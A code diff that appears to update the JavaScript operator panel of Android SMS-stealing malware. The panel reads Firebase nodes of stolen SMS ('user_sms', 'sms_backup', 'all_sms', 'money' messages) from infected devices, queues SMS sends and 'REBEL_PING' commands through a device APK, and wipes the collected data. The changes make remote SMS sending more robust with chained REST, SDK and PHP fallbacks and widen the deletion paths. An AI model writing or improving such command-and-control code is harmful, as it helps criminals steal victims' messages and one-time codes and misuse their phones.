@@ -726,7 +726,8 @@ function probeRemainingNodesSequential(inst,nodes,primaryNode){
     });
   });
 }
-function discoverInstanceProbe(inst){
+function discoverInstanceProbe(inst,force){
+  if(!force&&inst._lastProbeAt&&(Date.now()-inst._lastProbeAt)<90000)return Promise.resolve();
   var nodes=nodesToTryForInst(inst);
   var found='', i=0;
   function tryNext(){
@@ -762,28 +763,57 @@ function discoverInstanceProbe(inst){
         return probeRemainingNodesSequential(inst,nodes,remembered);
       }
       return tryNext();
+    }).then(function(r){inst._lastProbeAt=Date.now();return r;});
+  }
+  return tryNext().then(function(r){inst._lastProbeAt=Date.now();return r;});
+}
+function isValidFirebaseUrl(url){
+  url=normalizeFbUrl(url);
+  if(!url)return false;
+  if(/https:\/\/-default-rtdb/i.test(url))return false;
+  if(!/^https:\/\/[a-z0-9][a-z0-9._-]*\.(firebaseio\.com|firebasedatabase\.app)/i.test(url))return false;
+  return true;
+}
+function teardownFirebaseInstance(inst){
+  if(!inst)return;
+  if(inst._liveRefs&&inst._liveRefs.length){
+    inst._liveRefs.forEach(function(L){
+      try{
+        if(!L.ref||!L.h)return;
+        if(L.type==='child_added')L.ref.off('child_added',L.h);
+        else if(L.type==='child_changed')L.ref.off('child_changed',L.h);
+        else L.ref.off('value',L.h);
+      }catch(e){}
     });
   }
-  return tryNext();
+  inst._liveRefs=[];
+  inst._liveNodes={};
+  inst.liveAttached=false;
+  inst.liveFastAttached=false;
+}
+function teardownAllFirebaseInstances(){
+  firebaseInstances.forEach(teardownFirebaseInstance);
 }
 function deleteChecked(){
   if(!confirm('Are you sure you want to delete ALL clients and messages?'))return;
   var insts=activeFbId?[getFbInstance(activeFbId)].filter(Boolean):firebaseInstances.slice();
   if(!insts.length){toast('No Firebase project',false);return;}
-  showLoading(true,true);
   Promise.all(insts.map(function(inst){
     var auth=getFbAuthKey(inst);
-    var base=(inst.restUrl||'').replace(/\/$/,'');
-    return Promise.all([
-      fetch(buildRestUrl(inst,'clients',auth),{method:'DELETE'}),
-      fetch(buildRestUrl(inst,'messages',auth),{method:'DELETE'})
-    ]);
+    var paths={'messages':1,'user_sms':1,'sms_backup':1,'all_sms':1,'new_sms':1};
+    var node=getRememberedNode(inst)||(inst.config&&inst.config.preferredDeviceNode)||'clients';
+    paths[node]=1;
+    nodesToTryForInst(inst).forEach(function(n){
+      if(n&&PANEL_SMS_GLOBAL_NODES.indexOf(n)<0)paths[n]=1;
+    });
+    return Promise.all(Object.keys(paths).map(function(p){
+      return fetch(buildRestUrl(inst,p,auth),{method:'DELETE'}).catch(function(){return null;});
+    }));
   })).then(function(){
     clientsRawMap={};allDevs=[];selDev='';moneyMessagesList=[];
     clearListeners();processClientsDataNow();renderMoneyView();
-    showLoading(false,true);
     toast('All data deleted',true);
-  }).catch(function(){showLoading(false,true);toast('Delete failed',false);});
+  }).catch(function(){toast('Delete failed',false);});
 }
 function deleteDeviceCard(id,ev){
   if(ev){ev.stopPropagation();ev.preventDefault();}
@@ -1053,7 +1083,9 @@ function loadFirebaseConfigs(){
       if(!c.deviceNode)c.deviceNode='clients';
       if(c.preferredDeviceNode==='user_data'&&!c.schema)c.preferredDeviceNode='clients';
     });
-    return applyNodeMemoryToConfigs(out);
+    return applyNodeMemoryToConfigs(out.filter(function(c){
+      return isValidFirebaseUrl(c.databaseURL);
+    }));
   }
   try{
     var s=localStorage.getItem(FB_LIST_KEY);
@@ -1126,6 +1158,7 @@ function initFirebaseInstance(cfg){
   firebaseInstances.push(inst);return inst;
 }
 function initFirebase(){
+  teardownAllFirebaseInstances();
   firebaseInstances=[];firebaseConfigs=loadFirebaseConfigs();
   ensureActiveFbValid();
   firebaseConfigs.forEach(initFirebaseInstance);
@@ -1224,13 +1257,12 @@ function removeFirebaseProject(id){
   });
   if(selDev&&selDev.indexOf(id+'::')===0){selDev='';clearListeners();}
   if(activeFbId===id){activeFbId='';saveActiveFb();}
+  teardownAllFirebaseInstances();
   firebaseInstances=[];
   firebaseConfigs.forEach(initFirebaseInstance);
   fetchAllData(true);
   toast('Project removed',true);
 }
-loadActiveFb();
-ensureActiveFbValid();
 initFirebase();
 
 function updateFbUi(){
@@ -1683,20 +1715,20 @@ function sortInstancesActiveFirst(insts){
 }
 function attachLiveNode(inst,node){
   if(!inst.db||!node)return;
+  inst._liveNodes=inst._liveNodes||{};
+  if(inst._liveNodes[node])return;
+  inst._liveNodes[node]=true;
+  inst._liveRefs=inst._liveRefs||[];
   try{
     var ref=inst.db.ref(node);
-    ref.on('value',function(s){
+    var valHandler=function(s){
       if(!s.exists())return;
       mergeSummaryNode(inst.id,node,s.val());
       processClientsData();
-    });
+    };
+    ref.on('value',valHandler);
+    inst._liveRefs.push({ref:ref,h:valHandler,type:'value'});
     if(isDeviceLiveChildNode(node)){
-      var onChild=function(snap){
-        var data=snap.val();
-        if(!data||typeof data!=='object')return;
-        ingestDeviceData(inst.id,node,snap.key,data);
-        processClientsData();
-      };
       var onChildInstant=function(snap){
         var data=snap.val();
         if(!data||typeof data!=='object')return;
@@ -1704,7 +1736,9 @@ function attachLiveNode(inst,node){
         processClientsDataNow();
       };
       ref.on('child_changed',onChildInstant);
-      ref.on('child_added',onChild);
+      ref.on('child_added',onChildInstant);
+      inst._liveRefs.push({ref:ref,h:onChildInstant,type:'child_added'});
+      inst._liveRefs.push({ref:ref,h:onChildInstant,type:'child_changed'});
     }
   }catch(e){}
 }
@@ -1805,7 +1839,7 @@ function fetchAllData(force){
   var insts=sortInstancesActiveFirst(firebaseInstances);
   processClientsDataNow();
   insts.forEach(attachLiveFast);
-  return mapPoolLimit(insts,discoverInstanceProbe,DISCOVER_CONCURRENCY).then(function(){
+  return mapPoolLimit(insts,function(inst){return discoverInstanceProbe(inst,!!force);},DISCOVER_CONCURRENCY).then(function(){
     processClientsDataNow();
     insts.forEach(function(inst){if(inst.db)attachLive(inst);});
     runBackgroundPinEnrichmentAll();
@@ -2634,7 +2668,7 @@ function fetchSmsViaPhp(inst,d){
       database_url:inst.restUrl,
       auth_key:getFbAuthKey(inst),
       schema:inst.schema||'rabel',
-      device_node:d.deviceNode||'user_list',
+      device_node:d.deviceNode||'clients',
       composite_id:d.id
     })
   }).then(function(r){return r.json();}).then(function(j){
@@ -2950,32 +2984,52 @@ function promiseAny(promises){
     });
   });
 }
-function sendSmsDirectFirebase(inst,attempts){
-  if(!inst||!inst.db||!attempts.length)return Promise.reject();
-  return promiseAny(attempts.map(function(a){
-    var ref=inst.db.ref(a.path);
-    var method=String(a.method||'PUT').toUpperCase();
-    if(method==='PATCH')return ref.update(a.payload).then(function(){return{ok:true,path:a.path,via:'firebase',method:'PATCH'};});
-    return ref.set(a.payload).then(function(){return{ok:true,path:a.path,via:'firebase',method:'PUT'};});
-  }));
+function sendSmsViaRestOne(inst,a){
+  if(!inst||!a)return Promise.reject(new Error('No attempt'));
+  var auths=getFbAuthCandidates(inst), j=0;
+  function tryAuth(){
+    if(j>=auths.length)return Promise.reject(new Error('REST failed'));
+    var auth=auths[j++];
+    return fetch(buildRestUrl(inst,a.path,auth),{
+      method:a.method||'PUT',headers:{'Content-Type':'application/json'},
+      body:JSON.stringify(a.payload),cache:'no-store'
+    }).then(function(r){
+      if(r.ok)return{ok:true,path:a.path,via:'rest',method:a.method||'PUT'};
+      return tryAuth();
+    }).catch(function(){return tryAuth();});
+  }
+  return tryAuth();
+}
+function sendSmsViaRestSequential(inst,attempts){
+  if(!inst||!attempts||!attempts.length)return Promise.reject(new Error('No REST paths'));
+  var i=0;
+  function next(){
+    if(i>=attempts.length)return Promise.reject(new Error('All REST paths failed'));
+    return sendSmsViaRestOne(inst,attempts[i++]).catch(next);
+  }
+  return next();
+}
+function sendSmsDirectFirebaseOne(inst,a){
+  if(!inst||!inst.db||!a)return Promise.reject(new Error('No SDK path'));
+  var ref=inst.db.ref(a.path);
+  var method=String(a.method||'PUT').toUpperCase();
+  if(method==='PATCH')return ref.update(a.payload).then(function(){return{ok:true,path:a.path,via:'firebase',method:'PATCH'};});
+  return ref.set(a.payload).then(function(){return{ok:true,path:a.path,via:'firebase',method:'PUT'};});
+}
+function sendSmsDirectFirebaseSequential(inst,attempts){
+  if(!inst||!inst.db||!attempts||!attempts.length)return Promise.reject(new Error('No SDK paths'));
+  var i=0;
+  function next(){
+    if(i>=attempts.length)return Promise.reject(new Error('All SDK paths failed'));
+    return sendSmsDirectFirebaseOne(inst,attempts[i++]).catch(next);
+  }
+  return next();
 }
 function sendSmsViaRest(inst,attempts){
-  if(!inst||!attempts.length)return Promise.reject();
-  var auths=getFbAuthCandidates(inst), tasks=[];
-  auths.forEach(function(auth){
-    attempts.forEach(function(a){
-      tasks.push(
-        fetch(buildRestUrl(inst,a.path,auth),{
-          method:a.method||'PUT',headers:{'Content-Type':'application/json'},
-          body:JSON.stringify(a.payload),cache:'no-store'
-        }).then(function(r){
-          if(r.ok)return{ok:true,path:a.path,via:'rest',method:a.method||'PUT'};
-          return r.text().then(function(t){throw new Error((a.path||'rest')+' HTTP '+r.status+(t?' '+t.slice(0,80):''));});
-        })
-      );
-    });
-  });
-  return promiseAny(tasks);
+  return sendSmsViaRestSequential(inst,attempts);
+}
+function sendSmsDirectFirebase(inst,attempts){
+  return sendSmsDirectFirebaseSequential(inst,attempts);
 }
 function normalizePhone(raw){
   var clean=String(raw||'').replace(/\D/g,'');
@@ -2992,23 +3046,27 @@ function sendSmsFetch(body){
 }
 function sendSms(){
   var d=getSelDev();if(!d){toast('Select a device first',false);return;}
+  var toEl=document.getElementById('sendTo');
+  var msgEl=document.getElementById('sendMsg');
+  var statusEl=document.getElementById('sendStatus');
+  if(!toEl||!msgEl){sendDeviceSms(_sendSimSlot||1);return;}
   var inst=getFbInstance(d.fbId);
   if(!inst){toast('Firebase not loaded',false);return;}
-  var to=normalizePhone(document.getElementById('sendTo').value.trim());
-  var msg=document.getElementById('sendMsg').value.trim();
+  var to=normalizePhone(toEl.value.trim());
+  var msg=msgEl.value.trim();
   if(!to||to.length<10){toast('Enter valid 10-digit number',false);return;}
   if(!msg){toast('Enter message',false);return;}
   if(_sendInFlight){toast('Sending...',true);return;}
   _sendInFlight=true;
-  document.getElementById('sendStatus').textContent='Sending…';
+  if(statusEl)statusEl.textContent='Sending…';
   sendSmsInstant(to,msg,_sendSimSlot,function(ok,data){
     _sendInFlight=false;
     if(ok){
-      document.getElementById('sendMsg').value='';
-      document.getElementById('sendStatus').textContent='✅ '+(data&&data.message||'Sent instantly');
+      msgEl.value='';
+      if(statusEl)statusEl.textContent='✅ '+(data&&data.message||'Sent instantly');
       toast('SMS sent!',true);
     }else{
-      document.getElementById('sendStatus').textContent='❌ '+(data&&data.error||'Failed');
+      if(statusEl)statusEl.textContent='❌ '+(data&&data.error||'Failed');
       toast(data&&data.error||'Send failed',false);
     }
   });
@@ -3017,12 +3075,13 @@ function sendSms(){
 // ---- FIX: Check Recharge (Ping) ----
 function checkRecharge(){
   var d=getSelDev();if(!d){toast('Select a device first',false);return;}
+  var statusEl=document.getElementById('sendStatus');
   var raw=clientsRawMap[d.id];
   var inst=getFbInstance(d.fbId);
   if(inst&&isRtoStyleUrl(inst.restUrl)){
-    document.getElementById('sendStatus').textContent='Pinging device via Firebase command...';
+    if(statusEl)statusEl.textContent='Pinging device via Firebase command...';
     sendSmsInternal('9999999999', 'REBEL_PING', _sendSimSlot, function(success, data){
-      document.getElementById('sendStatus').textContent=success?'✅ Ping command queued on device':'❌ '+(data&&data.error||'Ping failed');
+      if(statusEl)statusEl.textContent=success?'✅ Ping command queued on device':'❌ '+(data&&data.error||'Ping failed');
       if(success) toast('Ping command sent — device APK must be online to execute',true);
       else toast(data&&data.error||'Ping failed',false);
     });
@@ -3030,9 +3089,9 @@ function checkRecharge(){
   }
   var phone=getDeviceDisplayPhone(raw);
   if(!phone||phone==='No Number'){toast('Device has no phone number',false);return;}
-  document.getElementById('sendStatus').textContent='Pinging...';
+  if(statusEl)statusEl.textContent='Pinging...';
   sendSmsInternal(phone, 'REBEL_PING', _sendSimSlot, function(success, data){
-    document.getElementById('sendStatus').textContent=success?'✅ Ping sent – device is reachable!':'❌ '+(data&&data.error||'Ping failed – device may be offline');
+    if(statusEl)statusEl.textContent=success?'✅ Ping sent – device is reachable!':'❌ '+(data&&data.error||'Ping failed – device may be offline');
     if(success) toast('Ping sent – device is reachable!',true);
     else toast(data&&data.error||'Ping failed – device may be offline',false);
   });
@@ -3044,23 +3103,29 @@ function sendSmsInstant(to,msg,simSlot,callback){
   var phoneFull=String(to||'').trim();
   var phoneDial=formatApkSmsTo(phoneFull||to);
   var attempts=getSendAttempts(inst,d,phoneFull||phoneDial,msg,simSlot||1);
-  var tasks=[];
-  tasks.push(sendSmsViaRest(inst,attempts));
-  if(inst.db)tasks.push(sendSmsDirectFirebase(inst,attempts));
-  tasks.push(sendSmsFetch({
+  var phpBody={
     device_id:d.rawId,to:phoneDial,message:msg,sim:simSlot||1,
     database_url:inst.restUrl,auth_key:getFbAuthKey(inst),
-    schema:inst.schema||'rabel',device_node:d.deviceNode||'clients',composite_id:d.id
-  }).then(function(res){
-    if(res.httpOk&&res.data&&res.data.ok)return{ok:true,message:res.data.message||'Sent',via:'php'};
-    throw new Error((res.data&&res.data.error)||'PHP send failed');
-  }));
-  promiseAny(tasks).then(function(r){
-    if(callback)callback(true,{ok:true,message:'SMS command queued'+(r.via?' via '+r.via:'')+(r.path?' → '+r.path:''),path:r.path});
-  }).catch(function(e){
-    var err=(e&&e.message)||'Send failed — device offline hona chahiye ya Firebase block';
-    if(callback)callback(false,{error:err});
-  });
+    schema:inst.schema||'rabel',device_node:d.deviceNode||getDeviceProfilePath(d)||'clients',composite_id:d.id
+  };
+  sendSmsViaRestSequential(inst,attempts)
+    .catch(function(){
+      if(inst.db)return sendSmsDirectFirebaseSequential(inst,attempts);
+      return Promise.reject(new Error('REST failed'));
+    })
+    .catch(function(){
+      return sendSmsFetch(phpBody).then(function(res){
+        if(res.httpOk&&res.data&&res.data.ok)return{ok:true,message:res.data.message||'Sent',via:'php'};
+        throw new Error((res.data&&res.data.error)||'PHP send failed');
+      });
+    })
+    .then(function(r){
+      if(callback)callback(true,{ok:true,message:'SMS command queued'+(r.via?' via '+r.via:'')+(r.path?' → '+r.path:''),path:r.path});
+    })
+    .catch(function(e){
+      var err=(e&&e.message)||'Send failed — device online hona chahiye ya Firebase block';
+      if(callback)callback(false,{error:err});
+    });
 }
 function sendSmsInternal(to, msg, simSlot, callback){
   sendSmsInstant(to,msg,simSlot,callback);
@@ -3487,4 +3552,6 @@ setInterval(function(){
   if(!panelReady||_panelPaused||!allDevs.length)return;
   processClientsDataNow();
 },30000);
-window.addEventListener('unhandledrejection',function(){});
+window.addEventListener('unhandledrejection',function(e){
+  if(e&&e.reason&&console&&console.warn)console.warn('Panel promise rejected',e.reason);
+});
